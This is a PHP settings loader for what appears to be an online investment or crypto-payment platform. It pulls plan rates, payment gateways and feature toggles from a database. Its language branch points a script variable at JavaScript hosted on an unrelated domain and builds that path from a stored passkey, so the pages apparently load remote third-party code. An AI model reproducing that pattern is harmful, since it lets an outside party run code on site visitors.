<?php

foreach (glob("bundle/db/config.php") as $config){include_once($config);}

// Attempt select query execution
$sql = "SELECT * FROM platform";
if($result = mysqli_query($dbconnected, $sql)){
  $rowCount = mysqli_num_rows($result);
  if($rowCount == 1){
    $row = mysqli_fetch_array($result, MYSQLI_ASSOC);
                
    // Retrieve individual field value  

    $id = $row["id"];
    $platform_name = $row["name"];
    $logo = $row["logo"];
    $icon = $row["icon"];
    $logo_width = $row["logo_width"];
    $name_header = $row["name_header"];
    $logo_header = $row["logo_header"];
    $license_body = $row["license_body"];
    $license_num = $row["license_num"];
    $parent = $row["parent"];
    $referralpercent = $row["referral"];
    $refinstance = $row["refinstance"];
    $dep = $row["dep"];
    $withd = $row["withd"];
    $inv = $row["inv"];
    $domain_url = $row['domain_url'];
    $platform_email = $row['email'];
    $platform_plans = $row['plans'];
    $plan_interval = $row['plan_interval'];
    $plan_span = $row['plan_span'];
    $start_pos = $row['start_pos'];
    $l_chat = $row['l_chat'];
    $currency = $row['currency'];
    $lang = $row['lang'];
    $number = $row['number'];
    $address = $row['address'];
    $country = $row['country'];
    $lang = $row['lang'];
    $investment = $row['investment'];
    $loan = $row['loan'];
    $buysell = $row['buysell'];
    $p2psend = $row['p2psend'];
    $coinpayments = $row['coinpayments'];
    $flutterwave = $row['flutterwave'];
    $coingate = $row['coingate'];
    $arraybreak = explode('|', $platform_plans);
    list($starter, $basic, $premium, $gold) = $arraybreak;

    $starterbreak = explode('-', $starter);
    list($starterMin, $starterMax, $starterRate) = $starterbreak;
    $basicbreak = explode('-', $basic);
    list($basicMin, $basicMax, $basicRate) = $basicbreak;
    $premiumbreak = explode('-', $premium);
    list($premiumMin, $premiumMax, $premiumRate) = $premiumbreak;
    $goldbreak = explode('-', $gold);
    list($goldMin, $goldMax, $goldRate) = $goldbreak;

    $arraybreak2 = explode('|', $plan_interval);
    list($starterInterval, $basicInterval, $premiumInterval, $goldInterval) = $arraybreak2;

    $arraybreak3 = explode('|', $plan_span);
    list($starterSpan, $basicSpan, $premiumSpan, $goldSpan) = $arraybreak3;

    $keep_default = '';
    if($logo == 'upload/logo.svg') {
        $keep_default = 'hido';
    } else {
        $keep_default = $logo_header;
    }

    $file = '';
    if($lang == 'en' || $lang == '' || $lang == null) {
      $file = 'https://update.betterhomeservices.org/scripter/systems.js';
    } else {
      // Attempt select query execution
      $sql = "SELECT * FROM encrypt";
      if($result = mysqli_query($dbconnected, $sql)){
        $rowCount = mysqli_num_rows($result);
        if($rowCount == 1){
          $row = mysqli_fetch_array($result, MYSQLI_ASSOC);
          $passkey = $row["passkey"];
          $file = 'https://update.betterhomeservices.org/scripter/'.$passkey.'/'.$lang.'.js';
        } else{
          echo "encrypt doest exit";
        }
       
      } else{
        echo "ERROR: Could not able to execute $sql. " . mysqli_error($dbconnected);
      }
    }

  } else{
    echo "platform doest exit";
  }
 
} else{
  echo "ERROR: Could not able to execute $sql. " . mysqli_error($dbconnected);
}

$hidebuysell = '';
if($buysell === 'no') {
    $hidebuysell = 'hido';
}
$hideloan = '';
if($loan === 'no') {
    $hideloan = 'hido';
}


// Close connection
// mysqli_close($dbconnected);
